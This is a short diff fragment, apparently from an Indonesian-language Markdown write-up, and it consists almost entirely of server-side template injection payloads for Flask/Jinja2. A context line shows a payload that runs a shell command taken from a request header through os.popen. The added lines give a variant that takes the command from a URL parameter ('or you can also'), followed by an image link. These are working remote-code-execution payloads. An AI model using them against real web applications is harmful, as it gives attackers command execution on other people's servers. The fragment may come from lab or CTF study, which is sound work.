@@ -52,6 +52,12 @@ Connection: keep-alive
 
 query={{url_for.__globals__.os.popen(request.headers.tel).read()}}
 ```
+atau bisa juga
+```
+{{url_for.__globals__.os.popen(request.args.a).read()}}
+```
+
+![alt text](image-2.png)
 
 ---
 
